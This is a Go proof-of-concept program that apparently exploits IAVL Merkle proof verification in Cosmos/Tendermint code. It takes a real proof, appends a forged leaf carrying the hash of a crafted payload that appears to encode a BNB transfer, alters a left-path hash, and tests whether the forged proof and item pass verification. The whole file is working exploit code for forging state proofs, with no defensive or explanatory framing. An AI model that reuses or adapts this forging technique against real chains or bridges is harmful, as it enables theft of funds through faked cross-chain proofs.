package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/cosmos/iavl"
	"github.com/tendermint/tendermint/crypto/tmhash"
)

var (
	legitValueOpBytes = `{
  "proof": {
    "left_path": [
      {
        "height": -13,
        "size": 17712663,
        "version": 270834726,
        "left": "apckQiMc3L0IP1P1tufRNk0Bp8PjlIGjk2Y0IdnZHnM=",
        "right": null
      },
      {
        "height": 12,
        "size": 11445957,
        "version": 270834726,
        "left": "AV6SWBcZVN4STq3KRzRxyFohjRtPMKtgRhI995sUPhA=",
        "right": null
      },
      {
        "height": -12,
        "size": 5162693,
        "version": 270834726,
        "left": "ZT7DkFxu6gfNYSJmTCNaW77nQXlum+sAkLZR8Ygapq8=",
        "right": null
      },
      {
        "height": 11,
        "size": 2033349,
        "version": 270834726,
        "left": "ENojnsAU43CLtjOUpqxlm/Cld14B+wYbpHSJ9acKHlk=",
        "right": null
      },
      {
        "height": -11,
        "size": 1246917,
        "version": 270834726,
        "left": "FtWQq25FECnW4P4uQUUZutByLHlgkVsJcJqNeUieaJ8=",
        "right": null
      },
      {
        "height": 10,
        "size": 460485,
        "version": 270834726,
        "left": "bl1CQ1uJOm7z0sMibcPY/GKYtQdlwUQBcXzOnUd5sXQ=",
        "right": null
      },
      {
        "height": -10,
        "size": 263877,
        "version": 270834726,
        "left": "pmxOIRBzVCvfvkG3/7PJcjPhMo4IMHWFVyVy4ghqcGY=",
        "right": null
      },
      {
        "height": 9,
        "size": 165573,
        "version": 270834726,
        "left": "u+plFGrcv2nbiqXUDqeLKIG75JoVUKeEiioVwL2McqE=",
        "right": null
      },
      {
        "height": -9,
        "size": 67269,
        "version": 270834726,
        "left": null,
        "right": "sgnG6uPGOO7e55C6SsS6Gijm7p5QjDEokPr2ggP2yPQ="
      },
      {
        "height": 8,
        "size": 39759,
        "version": 270834726,
        "left": "XqnzkU2yl7sqIWfHO0jWXvdQQSiBpBsmQxtQXhsIBxI=",
        "right": null
      },
      {
        "height": -8,
        "size": 23375,
        "version": 270834726,
        "left": "btxplnvcz6U0HGQb0RRoVmRzG2+8HrWuAlXlZoBQrhw=",
        "right": null
      },
      {
        "height": 7,
        "size": 15183,
        "version": 270834726,
        "left": "JFJWxpl2EGLuJiM3JSgdU7/2DQh+Y477AdfPwszAQvI=",
        "right": null
      },
      {
        "height": -7,
        "size": 6991,
        "version": 270834726,
        "left": "Iu0o97d+KTm23llH92vgFEVcqRuxWPvu6IyPZCiyhRI=",
        "right": null
      },
      {
        "height": 6,
        "size": 2895,
        "version": 270834726,
        "left": "kurWBlbT3jKka1EDqpFLeGV2976AyC3HaeIkbf47Q/8=",
        "right": null
      },
      {
        "height": -6,
        "size": 1871,
        "version": 270834726,
        "left": "DeJQpXWBmtNXuJcm2V/2M39kStgZcvFtIRca1QxGIQY=",
        "right": null
      },
      {
        "height": 5,
        "size": 847,
        "version": 270834726,
        "left": "4XDCz0QT5HX97/QRwo5cv6UObGQuqluVytdS5TrC+J0=",
        "right": null
      },
      {
        "height": -5,
        "size": 335,
        "version": 270834726,
        "left": "FmIvkStLQOgwz928oqrNywPyngEqoIQbCVmCR9D+f9M=",
        "right": null
      },
      {
        "height": 4,
        "size": 207,
        "version": 270834726,
        "left": "MaqRiMO/CHB5ZUKzKRz5wLQmTLBacgaETOxuqz7USF0=",
        "right": null
      },
      {
        "height": -4,
        "size": 79,
        "version": 270834726,
        "left": "aMfV0aYd5kspSnPIMHedPRQM1tGBLv02sB82FqIQ2nw=",
        "right": null
      },
      {
        "height": 3,
        "size": 47,
        "version": 270834726,
        "left": "G/7QEtEpSu3N1G1FGdQei3kDrsIftQJ21o3xwPHuqoE=",
        "right": null
      },
      {
        "height": -3,
        "size": 31,
        "version": 270834726,
        "left": "i1FAs/hJZXaXKMIdrXdlaF8V++qXrd1KGODhn7+oEtw=",
        "right": null
      },
      {
        "height": 2,
        "size": 15,
        "version": 270834726,
        "left": "YhLdwXMes8cnXCIChGHKYYrbacqVi5cLpwpp78r3RvA=",
        "right": null
      },
      {
        "height": -2,
        "size": 7,
        "version": 270834726,
        "left": "J9UJ7VBbpRicAuCajOu9jaiLD5+4C9STMD6VY5bV+n0=",
        "right": null
      },
      {
        "height": 1,
        "size": 3,
        "version": 270834726,
        "left": "TuMIccrzcyEK4278aZy03RwVF8VxXx93HLzD4XY8u3Y=",
        "right": null
      },
      {
        "height": -1,
        "size": 2,
        "version": 270834726,
        "left": "hgU6M3xsAMCLAVD0sEwl1GpUW/yk/9I7y59Lq1YgqcQ=",
        "right": null
      }
    ],
    "inner_nodes": null,
    "leaves": [
      {
        "key": "00000100380200000000010DDA4D",
        "value": "C9702DC684F40F649086354EFD81036405D65BD7973B33A49BD094ADA8BEA341",
        "version": 270834726
      }
    ]
  }
}
`

	forgedValueOp = `{
  "proof": {
    "left_path": [
      {
        "height": -13,
        "size": 17712663,
        "version": 270834726,
        "left": "apckQiMc3L0IP1P1tufRNk0Bp8PjlIGjk2Y0IdnZHnM=",
        "right": null
      },
      {
        "height": 12,
        "size": 11445957,
        "version": 270834726,
        "left": "AV6SWBcZVN4STq3KRzRxyFohjRtPMKtgRhI995sUPhA=",
        "right": null
      },
      {
        "height": -12,
        "size": 5162693,
        "version": 270834726,
        "left": "ZT7DkFxu6gfNYSJmTCNaW77nQXlum+sAkLZR8Ygapq8=",
        "right": null
      },
      {
        "height": 11,
        "size": 2033349,
        "version": 270834726,
        "left": "ENojnsAU43CLtjOUpqxlm/Cld14B+wYbpHSJ9acKHlk=",
        "right": null
      },
      {
        "height": -11,
        "size": 1246917,
        "version": 270834726,
        "left": "FtWQq25FECnW4P4uQUUZutByLHlgkVsJcJqNeUieaJ8=",
        "right": null
      },
      {
        "height": 10,
        "size": 460485,
        "version": 270834726,
        "left": "bl1CQ1uJOm7z0sMibcPY/GKYtQdlwUQBcXzOnUd5sXQ=",
        "right": null
      },
      {
        "height": -10,
        "size": 263877,
        "version": 270834726,
        "left": "pmxOIRBzVCvfvkG3/7PJcjPhMo4IMHWFVyVy4ghqcGY=",
        "right": null
      },
      {
        "height": 9,
        "size": 165573,
        "version": 270834726,
        "left": "u+plFGrcv2nbiqXUDqeLKIG75JoVUKeEiioVwL2McqE=",
        "right": null
      },
      {
        "height": -9,
        "size": 67269,
        "version": 270834726,
        "left": null,
        "right": "sgnG6uPGOO7e55C6SsS6Gijm7p5QjDEokPr2ggP2yPQ="
      },
      {
        "height": 8,
        "size": 39759,
        "version": 270834726,
        "left": "XqnzkU2yl7sqIWfHO0jWXvdQQSiBpBsmQxtQXhsIBxI=",
        "right": null
      },
      {
        "height": -8,
        "size": 23375,
        "version": 270834726,
        "left": "btxplnvcz6U0HGQb0RRoVmRzG2+8HrWuAlXlZoBQrhw=",
        "right": null
      },
      {
        "height": 7,
        "size": 15183,
        "version": 270834726,
        "left": "JFJWxpl2EGLuJiM3JSgdU7/2DQh+Y477AdfPwszAQvI=",
        "right": null
      },
      {
        "height": -7,
        "size": 6991,
        "version": 270834726,
        "left": "Iu0o97d+KTm23llH92vgFEVcqRuxWPvu6IyPZCiyhRI=",
        "right": null
      },
      {
        "height": 6,
        "size": 2895,
        "version": 270834726,
        "left": "kurWBlbT3jKka1EDqpFLeGV2976AyC3HaeIkbf47Q/8=",
        "right": null
      },
      {
        "height": -6,
        "size": 1871,
        "version": 270834726,
        "left": "DeJQpXWBmtNXuJcm2V/2M39kStgZcvFtIRca1QxGIQY=",
        "right": null
      },
      {
        "height": 5,
        "size": 847,
        "version": 270834726,
        "left": "4XDCz0QT5HX97/QRwo5cv6UObGQuqluVytdS5TrC+J0=",
        "right": null
      },
      {
        "height": -5,
        "size": 335,
        "version": 270834726,
        "left": "FmIvkStLQOgwz928oqrNywPyngEqoIQbCVmCR9D+f9M=",
        "right": null
      },
      {
        "height": 4,
        "size": 207,
        "version": 270834726,
        "left": "MaqRiMO/CHB5ZUKzKRz5wLQmTLBacgaETOxuqz7USF0=",
        "right": null
      },
      {
        "height": -4,
        "size": 79,
        "version": 270834726,
        "left": "aMfV0aYd5kspSnPIMHedPRQM1tGBLv02sB82FqIQ2nw=",
        "right": null
      },
      {
        "height": 3,
        "size": 47,
        "version": 270834726,
        "left": "G/7QEtEpSu3N1G1FGdQei3kDrsIftQJ21o3xwPHuqoE=",
        "right": null
      },
      {
        "height": -3,
        "size": 31,
        "version": 270834726,
        "left": "i1FAs/hJZXaXKMIdrXdlaF8V++qXrd1KGODhn7+oEtw=",
        "right": null
      },
      {
        "height": 2,
        "size": 15,
        "version": 270834726,
        "left": "YhLdwXMes8cnXCIChGHKYYrbacqVi5cLpwpp78r3RvA=",
        "right": null
      },
      {
        "height": -2,
        "size": 7,
        "version": 270834726,
        "left": "J9UJ7VBbpRicAuCajOu9jaiLD5+4C9STMD6VY5bV+n0=",
        "right": null
      },
      {
        "height": 1,
        "size": 3,
        "version": 270834726,
        "left": "TuMIccrzcyEK4278aZy03RwVF8VxXx93HLzD4XY8u3Y=",
        "right": null
      },
      {
        "height": -1,
        "size": 2,
        "version": 270834726,
        "left": "hgU6M3xsAMCLAVD0sEwl1GpUW/yk/9I7y59Lq1YgqcQ=",
        "right": null
      }
    ],
    "inner_nodes": null,
    "leaves": [
      {
        "key": "00000100380200000000010DDA4D",
        "value": "C9702DC684F40F649086354EFD81036405D65BD7973B33A49BD094ADA8BEA341",
        "version": 270834726
      }
    ]
  }
}
`
)

func mustDecode(str string) []byte {
	if strings.HasPrefix(str, "0x") {
		str = str[2:]
	}
	b, err := hex.DecodeString(str)
	if err != nil {
		panic(err)
	}
	return b
}

func getValueOp(valueOpBytes []byte) *iavl.ValueOp {
	op := iavl.NewValueOp([]byte{0, 0, 1, 0, 56, 2, 0, 0, 0, 0, 1, 13, 218, 77}, nil)
	err := json.Unmarshal(valueOpBytes, &op)
	if err != nil {
		panic(err)
	}
	return &op
}

func main() {
	legitPayloadBytes := mustDecode("0x00000000000000000000000000000000000000000000000000000e35fa931a0000f86ea0424e42000000000000000000000000000000000000000000000000000000000094000000000000000000000000000000000000000088018fb570626fa400942218ffe5fd6215aefb988c5130b109047ef903cc943cf604378ded77537f02ed2d082a609a0235864b84633f540c")

	forgedPayloadBytes := mustDecode("0x000000000000000000000000000000000000000000000000000000000000000000f870a0424e4200000000000000000000000000000000000000000000000000000000009400000000000000000000000000000000000000008ad3c21bcecceda100000094489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec94489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec846553f100")
	forgedValueHash := tmhash.Sum(forgedPayloadBytes)

	legitValueOp := getValueOp([]byte(legitValueOpBytes))
	forgedValueOp := getValueOp([]byte(legitValueOpBytes))

	bz, _ := json.MarshalIndent(legitValueOp, "", "  ")
	fmt.Println(string(bz))

	// we do a little forging
	forgedLeafNode := legitValueOp.Proof.Leaves[0]
	//forgedLeafNode.Key = append([]byte(nil), []byte(forgedValueOp.GetKey())...)
	forgedLeafNode.Key = []byte("00000100380200000000010DDA4D")
	forgedLeafNode.Key[13] = 255
	forgedLeafNode.ValueHash = forgedValueHash
	forgedValueOp.Proof.Leaves = append(forgedValueOp.Proof.Leaves, forgedLeafNode)
	forgedValueOp.Proof.InnerNodes = append(forgedValueOp.Proof.InnerNodes, iavl.PathToLeaf{})
	forgedValueOp.Proof.LeftPath[len(forgedValueOp.Proof.LeftPath)-1].Right = mustDecode("A038FCFB3DD5C419DF679CE76FDAB39D21149069D037C39034CEF55AFDB9631B")

	rootHash := legitValueOp.Proof.ComputeRootHash()
	verifyErr := legitValueOp.Proof.Verify(rootHash)
	fmt.Printf("legitOp rootHash=%X verifyErr=%v\n", rootHash, verifyErr)

	rootHash = forgedValueOp.Proof.ComputeRootHash()
	verifyErr = forgedValueOp.Proof.Verify(rootHash)
	fmt.Printf("forgedOp rootHash=%X verifyErr=%v\n", rootHash, verifyErr)

	{
		verifyErr = legitValueOp.Proof.VerifyItem([]byte(legitValueOp.GetKey()), legitPayloadBytes)
		fmt.Printf("legit op legit item verifyErr=%v\n", verifyErr)
		verifyErr = legitValueOp.Proof.VerifyItem(forgedLeafNode.Key, forgedPayloadBytes)
		fmt.Printf("legit op forged item verifyErr=%v\n", verifyErr)
	}

	{
		verifyErr = forgedValueOp.Proof.VerifyItem([]byte(legitValueOp.GetKey()), legitPayloadBytes)
		fmt.Printf("forged op legit item verifyErr=%v\n", verifyErr)
		verifyErr = forgedValueOp.Proof.VerifyItem(forgedLeafNode.Key, forgedPayloadBytes)
		fmt.Printf("forged op forged item verifyErr=%v\n", verifyErr)
	}
}
